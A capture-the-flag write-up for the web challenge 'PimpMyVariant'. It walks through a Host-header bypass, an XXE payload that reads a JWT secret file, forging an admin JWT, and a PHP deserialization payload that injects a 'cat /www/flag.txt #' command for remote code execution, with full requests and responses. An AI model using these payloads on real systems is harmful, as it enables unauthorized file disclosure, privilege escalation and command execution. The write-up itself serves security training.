
# PimpMyVariant

Categories: Web

Description:
> Seen as it went, why not guess the next variant name : [pimpmyvariant.insomnihack.ch](pimpmyvariant.insomnihack.ch)

## Takeaways

* [HTTP Host header attacks](https://portswigger.net/web-security/host-header) and how to [identify them](https://portswigger.net/web-security/host-header/exploiting)
* In combination with the Host header attack, [these additional headers](https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c) might had to be used in a more strict setting.
* [JWT (JSON Web Tokens)](https://jwt.io/#debugger-io) manipulation
* [XML External Entity (XXE) injection](https://portswigger.net/web-security/xxe)
* [Exploiting insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting) in [PHP](https://github.com/nikosChalk/exploitation-training/blob/master/web-exploitation/php-specific.md#php-object-injection-aka-php-deserialization). We modify a serialized object provided to us by the server and also inject an additional one.

## Solution

When we visit the given challenge website, we are presented with a static webpage

![home.png](resources/home.png)

It is also running purely on HTTP and not HTTPS, for convenience. What we are seeing here are current covid-19 variants and potentially future variant names. These are taken from the greek alphabet, so a guess for the next variant name is "Kappa". But where shall we enter it?

The site is static and has no links. A common place to look for other endpoitns is `/robots.txt`

```
GET /robots.txt HTTP/1.1

HTTP/1.1 200 OK
Server: nginx
Date: Mon, 31 Jan 2022 12:02:11 GMT
Content-Type: text/plain
Content-Length: 38
Last-Modified: Fri, 28 Jan 2022 20:53:26 GMT
Connection: close
ETag: "61f457c6-26"
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-transform
Feature-Policy: geolocation none;midi none;notifications none;push none;sync-xhr none;microphone none;camera none;magnetometer none;gyroscope none;speaker self;vibrate none;fullscreen self;payment none;
Accept-Ranges: bytes

/readme
/new
/log
/flag.txt
/todo.txt
```

So from this we get a bunch of endpoints and we also know that the server is running nginx. Let's try visiting those endpoints:

```html
GET /readme HTTP/1.1

HTTP/1.1 200 OK

<head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Readme</h1>

Hostname not allowed
```

```html
GET /new HTTP/1.1

HTTP/1.1 200 OK

<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>New variant</h1>

Hostname not autorized
```

```html
GET /log HTTP/1.1

HTTP/1.1 200 OK

<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Logs</h1>

Access restricted to admin only
```

```html
GET /flag.txt HTTP/1.1

HTTP/1.1 403 Forbidden

Try harder
```

```html
GET /todo.txt HTTP/1.1

HTTP/1.1 200 OK

test back
```

Response headers are similar to the first request, so we omit them from our analysis here. Two endpoints (`/readme`, `/new`) state that the "Hostname" is not allowed/authorized. The endpoint `/log` requires us to be admin while `/todo.txt` is accessible. The intuition here is to first bypass the Hostname defense and furthermore become admin to access the logs and potentially get the flag.

From the "Hostname" not allowed/authorized message we get the intuition that the request first goes through a load balancer which parses the `Host` HTTP request header before reaching a target back-end server. Tampering with it indeed allows us to bypass the defense:

```html
GET /readme HTTP/1.1
Host: 127.0.0.1

HTTP/1.1 200 OK

<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Readme</h1>

#DEBUG- JWT secret key can now be found in the /www/jwt.secret.txt file
```

```html
GET /new HTTP/1.1
Host: 127.0.0.1

HTTP/1.1 200 OK

<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>New variant</h1>


<form method="post" enctype="application/x-www-form-urlencoded" id="variant_form">
	Guess the next variant name : <input type="text" name="variant_name" id="variant_name" placeholder="inso-micron ?" /><br />
	<input type="submit" name="Bet on this" />
</form>
<script type="text/javascript">
document.getElementById('variant_form').onsubmit = function(){
	var variant_name=document.getElementById('variant_name').value;
	postData('/api', "<?xml version='1.0' encoding='utf-8'?><root><name>"+variant_name+"</name></root>")
		.then(data => {
			window.location.href='/';
		});
	return false;
}

async function postData(url = '', data = {}) {
	return await fetch(url, {
		method: 'POST',
		cache: 'no-cache',
		headers: {
			'Content-Type': 'text/xml'
		},
		redirect: 'manual',
		referrerPolicy: 'no-referrer',
		body: data
	});
}
</script>

</body></html>
```

So the `/readme` endpoint reveals us a secret JWT key in `/www/jwt.secret.txt`

```html
GET /www/jwt.secret.txt HTTP/1.1
Host: 127.0.0.1

HTTP/1.1 403 Forbidden

Try harder
```

It seems that we cannot simply retrieve it and we have to find another way. But we also unlocked the `/new` endpoint, which is a form submission for a new variant. The form is submitted in the `/api` endpoint and we seem to be able to control the full XML file that is being submitted. Let's try it out:

```html
POST /api HTTP/1.1
Host: pimpmyvariant.insomnihack.ch

<?xml version='1.0' encoding='utf-8'?><root><name>foobar</name></root>

HTTP/1.1 302 Found
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiZm9vYmFyIl0sInNldHRpbmdzIjoiYToxOntpOjA7Tzo0OlwiVXNlclwiOjM6e3M6NDpcIm5hbWVcIjtzOjQ6XCJBbm9uXCI7czo3OlwiaXNBZG1pblwiO2I6MDtzOjI6XCJpZFwiO3M6NDA6XCIxYzY1YTU3ZGYzYmRlMGIxZGYyYTljZDZkMmFhMjdjZTY1YTMxZDIyXCI7fX0iLCJleHAiOjE2NDM2MzIyMjN9.M9rJq2vBO5VErQgGxcyWcuMFxQ0rKSyneV9HqHkrdtM
Location: /

<?xml version="1.0" encoding="utf-8"?>
<root><sucess>Variant name added !</sucess></root>

GET / HTTP/1.1
Cookie: jwt=...

HTTP/1.1 200 OK

<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Variants list</h1>

<ul><li>Alpha</li><li>Beta</li><li>Gamma</li><li>Delta</li><li>Omicron</li><li>Lambda</li><li>Epsilon</li><li>Zeta</li><li>Eta</li><li>Theta</li><li>Iota</li><li>foobar</li></ul>
</body></html>
```

Interesting, a lot of things are happening. Let's break it down:

* We have complete control over the XML file that is being submitted
* After `POST /api` the server tells us that the variant was successfully added and also sets a JWT (JSON Web Token) as a cookie. Then it redirects us to the home page `/`
* The homepage displays the `foobar` value that we submitted in the XML.

Since we have complete control over the XML file, we should attempt an [XXE attack](https://portswigger.net/web-security/xxe). Also, since the name is reflected in the homepage, the web app might also be susceptible to [XSS](https://portswigger.net/web-security/cross-site-scripting) attacks, but this is not interesting since no other user or admin is accessing the web app.

Let's also analyze the JWT that the server sent us:

```txt
# Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

# Payload
{
  "variants": [
    "Alpha",
    "Beta",
    "Gamma",
    "Delta",
    "Omicron",
    "Lambda",
    "Epsilon",
    "Zeta",
    "Eta",
    "Theta",
    "Iota",
    "foobar"
  ],
  "settings": "a:1:{i:0;O:4:\"User\":3:{s:4:\"name\";s:4:\"Anon\";s:7:\"isAdmin\";b:0;s:2:\"id\";s:40:\"1c65a57df3bde0b1df2a9cd6d2aa27ce65a31d22\";}}",
  "exp": 1643632223
}

# Signature
M9rJq2vBO5VErQgGxcyWcuMFxQ0rKSyneV9HqHkrdtM
```

The JWT token seems to include our covid-19 variant guess. The `settings` part is particularly interesting because it is a PHP deserialized object and the server could be vulnerable to PHP deserialization attacks. The fields `name` and `isAdmin` in the deserialized object seem promising.

Tampering with the token to become admin and trying to visit `/log` was not successful, probably because we need to also use JWT secret key. So let's try to use an XXE to leak `/www/jwt.secret.txt`

```html
POST /api HTTP/1.1

<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE foobar [ <!ENTITY myentity SYSTEM "file:///www/jwt.secret.txt"> ]>
<root>
<name>
&myentity;
</name></root>

HTTP/1.1 302 Found
Location: /
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjE6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NDpcIkFub25cIjtzOjc6XCJpc0FkbWluXCI7YjowO3M6MjpcImlkXCI7czo0MDpcImNmZDZkNDAxMDYxZWE0NTY5MWFmMDBjZTA0ZDYwOTcxYThmYWY1N2JcIjt9fSIsImV4cCI6MTY0MzYzMzQ4M30.YsJ-YihF2vjECIsLbakj1xD0_SL5QzbovYSGndiyD9A

<?xml version="1.0" encoding="utf-8"?>
<root><sucess>Variant name added !</sucess></root>

GET / HTTP/1.1
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjE6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NDpcIkFub25cIjtzOjc6XCJpc0FkbWluXCI7YjowO3M6MjpcImlkXCI7czo0MDpcImNmZDZkNDAxMDYxZWE0NTY5MWFmMDBjZTA0ZDYwOTcxYThmYWY1N2JcIjt9fSIsImV4cCI6MTY0MzYzMzQ4M30.YsJ-YihF2vjECIsLbakj1xD0_SL5QzbovYSGndiyD9A

HTTP/1.1 200 OK
<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Variants list</h1>

<ul><li>Alpha</li>...<li>Iota</li><li>54b163783c46881f1fe7ee05f90334aa</li>...
```

And indeed the XXE worked! We manage to retrieve the secret key `54b163783c46881f1fe7ee05f90334aa` for the JWT token.

Now let's modify the [above JWT](https://jwt.io/#debugger-io?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjE6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NDpcIkFub25cIjtzOjc6XCJpc0FkbWluXCI7YjowO3M6MjpcImlkXCI7czo0MDpcImNmZDZkNDAxMDYxZWE0NTY5MWFmMDBjZTA0ZDYwOTcxYThmYWY1N2JcIjt9fSIsImV4cCI6MTY0MzYzMzQ4M30.YsJ-YihF2vjECIsLbakj1xD0_SL5QzbovYSGndiyD9A) and change `name` to `admin`, `isAdmin` to `1`, `exp` to a much later expiration date, and also use the above secret key to sign the token.

So let's use our [modified JWT](https://jwt.io/#debugger-io?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjE6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NTpcImFkbWluXCI7czo3OlwiaXNBZG1pblwiO2I6MTtzOjI6XCJpZFwiO3M6NDA6XCJjZmQ2ZDQwMTA2MWVhNDU2OTFhZjAwY2UwNGQ2MDk3MWE4ZmFmNTdiXCI7fX0iLCJleHAiOjI2NDM2MzM0ODN9.FslN9xPgQpkn1dFKwRZHQTa-lcyMAX7Q2CQfVG12hxc) to make a request to `/log` and bypass the admin check.

```html
GET /log HTTP/1.1
Host: 127.0.0.1
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjE6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NTpcImFkbWluXCI7czo3OlwiaXNBZG1pblwiO2I6MTtzOjI6XCJpZFwiO3M6NDA6XCJjZmQ2ZDQwMTA2MWVhNDU2OTFhZjAwY2UwNGQ2MDk3MWE4ZmFmNTdiXCI7fX0iLCJleHAiOjI2NDM2MzM0ODN9.FslN9xPgQpkn1dFKwRZHQTa-lcyMAX7Q2CQfVG12hxc

HTTP/1.1 200 OK

<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Logs</h1>

<textarea style="width:100%; height:100%; border:0px;" disabled="disabled">
[2021-12-25 02:12:01] Fatal error: Uncaught Error: Bad system command call from UpdateLogViewer::read() from global scope in /www/log.php:36
Stack trace:
#0 {main}
  thrown in /www/log.php on line 37
#0 {UpdateLogViewer::read}
  thrown in /www/UpdateLogViewer.inc on line 26

</textarea>
</body></html>
```

Awesome! We bypassed the admin check. In the log, we see a PHP error and we also notice the file `/www/UpdateLogViewer.inc`. Let's try accessing it

```php
GET /UpdateLogViewer.inc HTTP/1.1

HTTP/1.1 200 OK
<?php

class UpdateLogViewer
{
	public string $packgeName;
	public string $logCmdReader;
	private static ?UpdateLogViewer $singleton = null;
	
	private function __construct(string $packgeName)
	{
		$this->packgeName = $packgeName;
		$this->logCmdReader = 'cat';
	}
	
	public static function instance() : UpdateLogViewer
	{
		if( !isset(self::$singleton) || self::$singleton === null ){
			$c = __CLASS__;
			self::$singleton = new $c("$c");
		}
		return self::$singleton;
	}
	
	public static function read():string
	{
		return system(self::logFile());
	}
	
	public static function logFile():string
	{
		return self::instance()->logCmdReader.' /var/log/UpdateLogViewer_'.self::instance()->packgeName.'.log';
	}
	
    public function __wakeup()// serialize
    {
    	self::$singleton = $this; 
    }
};
```

We see that the `UpdateLogViewer` class implements the [PHP magic method](https://www.php.net/manual/en/language.oop5.magic.php) `__wakeup()` which is automatically invoked for a deserialzied object of this class. We also know from the `/log` messages that `/www/log.php` invokes `UpdateLogViewer::read()`.

We can create our own instance of `UpdateLogViewer` that will dump the `/www/flag.txt` file when `UpdateLogViewer::read()` is invoked. We can serialize this PHP object and embed it in the JWT token. When the server receives it, it will invoke the `__wakeup()` method and use our malicious object instead of the original one that it has.

We use the following snippet of PHP code to generate the appropriate PHP serialized object that will be placed inside the `settings` part of the JWT token.

```php
$x = UpdateLogViewer::instance();
$x->packgeName = '';
$x->logCmdReader = 'cat /www/flag.txt #';

$prefix = 'a:2:{i:0;O:4:"User":3:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;s:2:"id";s:40:"cfd6d401061ea45691af00ce04d60971a8faf57b";}i:1;';
$suffix = '}';
print($prefix . serialize($x) . $suffix);
```

```php
a:2:{i:0;O:4:"User":3:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;s:2:"id";s:40:"cfd6d401061ea45691af00ce04d60971a8faf57b";}i:1;O:15:"UpdateLogViewer":2:{s:10:"packgeName";s:0:"";s:12:"logCmdReader";s:19:"cat /www/flag.txt #";}}
```

We can use [this tool](https://www.unserialize.com) to verify that the above payload deserializes correctly. Let's also escape the double quote characters so that it is in a valid format for the JWT token.

```log
a:2:{i:0;O:4:\"User\":3:{s:4:\"name\";s:5:\"admin\";s:7:\"isAdmin\";b:1;s:2:\"id\";s:40:\"cfd6d401061ea45691af00ce04d60971a8faf57b\";}i:1;O:15:\"UpdateLogViewer\":2:{s:10:\"packgeName\";s:0:\"\";s:12:\"logCmdReader\";s:19:\"cat /www/flag.txt #\";}}
```

So, we create a [malicious JWT](https://jwt.io/#debugger-io?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjI6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NTpcImFkbWluXCI7czo3OlwiaXNBZG1pblwiO2I6MTtzOjI6XCJpZFwiO3M6NDA6XCJjZmQ2ZDQwMTA2MWVhNDU2OTFhZjAwY2UwNGQ2MDk3MWE4ZmFmNTdiXCI7fWk6MTtPOjE1OlwiVXBkYXRlTG9nVmlld2VyXCI6Mjp7czoxMDpcInBhY2tnZU5hbWVcIjtzOjA6XCJcIjtzOjEyOlwibG9nQ21kUmVhZGVyXCI7czoxOTpcImNhdCAvd3d3L2ZsYWcudHh0ICNcIjt9fSIsImV4cCI6MjY0MzYzMzQ4M30.2Hediv2wh6h8rvHPni9Dpram-wjVfl_hNOsd6YxBXGQ) this time and send it to the server when accessing `/log`

```html
GET /log HTTP/1.1
Host: 127.0.0.1
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjI6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NTpcImFkbWluXCI7czo3OlwiaXNBZG1pblwiO2I6MTtzOjI6XCJpZFwiO3M6NDA6XCJjZmQ2ZDQwMTA2MWVhNDU2OTFhZjAwY2UwNGQ2MDk3MWE4ZmFmNTdiXCI7fWk6MTtPOjE1OlwiVXBkYXRlTG9nVmlld2VyXCI6Mjp7czoxMDpcInBhY2tnZU5hbWVcIjtzOjA6XCJcIjtzOjEyOlwibG9nQ21kUmVhZGVyXCI7czoxOTpcImNhdCAvd3d3L2ZsYWcudHh0ICNcIjt9fSIsImV4cCI6MjY0MzYzMzQ4M30.2Hediv2wh6h8rvHPni9Dpram-wjVfl_hNOsd6YxBXGQ

HTTP/1.1 200 OK

<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Logs</h1>

<textarea style="width:100%; height:100%; border:0px;" disabled="disabled">
[2021-12-25 02:12:01] Fatal error: Uncaught Error: Bad system command call from UpdateLogViewer::read() from global scope in /www/log.php:36
Stack trace:
#0 {main}
  thrown in /www/log.php on line 37
#0 {UpdateLogViewer::read}
  thrown in /www/UpdateLogViewer.inc on line 26

                                               WNNNNWW
                                            WWWNXXXXXNW
                                           NK00OOOOOOOKW
                                           NK00OOOOOKXW          WW                  WW
                                           NXK000OO0KNW          WWWWWW            WWWNWWWWW
                                               WK0O0N         WNK0OOOXW           WK0OOOO0XNW
                                                NK00KW        WWNK0KNW            WX0OOOkOOON
                                  WWWWWWWW       X0OKW           XOKW             WX0OO000O0N
                                  WWNX00XW       X00O0NW      WWNK0XW             WX0OOKXXXNW
                                  NKKO00X     WNXKOOkkOOOOOOOOOOOOOOKKKKXXXNNW  WNKOOKNWWWW
                                  NXK00OKWWWWNXKK0OOOOOOOOOOOOOOOOOOOOO0KKXXXNWWNKOO0XW        W
                                     WN0O0000OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0OOO0XW       WNNNW
                      WWWW         WNX0OkOOkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkkkOOO0KXW     WN0O00N
                    WWWNNW     WWWNNX0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkOKXNWWWWNXK000X
                    NK0OOX     WWX000OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOk0KXXK00XNNNW
                   X00OOOOKXNWX000OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOKNW
                   NK00KKKKKKKK00OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOKWW        WWNWW
                   WWWWWWXK0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0NW      WNXXNW
         WWW             NX0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkOKNW   WN00OOXW
       WNNXKXW          WNKOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0KXNWNXXKOOO0NW
       NK0OOOX         WNKOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00OO00O00OKW
     WNKOOOOOO0KXNNWWWNX0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0XW  WWNNWW
     WNKOOOOO00KXXKXXXX0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOk0NW    WNW
     WNKOOOO0XKK0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOk0W
       WNNNW    WW WNKOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0KW        WX00OOXW
       WWWW        WNKOOOOOOkkkOOOOOOOOOOOOOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkk0XNNNWWWNNXK0OOOKNW
                    WKOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0KXNNXXK00OOOO0XW
                    WKkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO                 OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOxxO00000O0OOOOOXW
             WNXNNNWNOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO ############### OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOxkKXXXXXXXK0OOOKN
             WX0KXNNXOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO # 1NS0MN1H4CK # OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOxKW      WNK0OOXW
             WX0O0XNKOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO ############### OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOKKN
             WNXKXWWN0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO                 OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkXWXNW
               WW   WX0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0NW
                     WK0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOKXXNXXKKNW
                     WX0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00KNXXX0O0NW
                    WWKOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0XNXXK0Ok0NW
          WX00KXNNXK0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOX     WNXXNW
          WXOkO000KKKXXXX00OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0XW     WWWWW
          WX0OOOOO0KNW  WX00OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOKW
           WX0OOOKW       WNKOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0XW
           WWNXXXNW        WXKOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0000KKKXXNNXXXXNW
             WWWW           NX0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0KK0O00KXXK00KNW
                          WNK0OOkO0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOKNW    WWX0OOOOk0NW
                        WNXK00KXNNXK0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkO0KXNW       WKOOOOOKXW
               WW WWW WWN00OOKXW  WXK00OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkO00XW          X00OO0XW
               WX0OkO0OOOOXWW        WX0OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0NW            WWNNWW
               WK0OOOkOOOXW         WX0O0KXXXKK000OOOOOOOOOOOOOOOOOOOOOOkO00KXXNX0O0KNW
               WX00OOOOOOX      WWW WKO0KNW WNXXK0O00OOOOOOOOOOOOOOOOOOOOOKXNWWWNXKO0NWWW  W
                WNK0OOOO0N     XOO00OkOXW           WNX0OOO0XNNNNNWWWWWX00X       WKOO0XXNNNW
                WWWNNNXNNW     NK0OO0OOKNW            WXOOKNW    WW   WX0kOKXN    NX0OOO000KN
                      W        WXK000OO0KNW            XOOXW          WKOOO0XN    WKOOOOOO0KN
                                    WNNNNW           WNK00N           WXXXNW     WX0OOO00KNW
                                    WWWW             WX0O0N           WWWWWW      WWWWNNWW
                                                  WWWX0OOOKW
                                                  N00OOOOOk0XW
                                                  WK00O0OOk0XW
                                                  WX0000000KXW

The flag is INS{P!mpmYV4rianThat's1flag}
</textarea>
</body></html>
```

We are presented with some cool ASCII art and also the flag! We effectively have an RCE on the web server!

`INS{P!mpmYV4rianThat's1flag}`
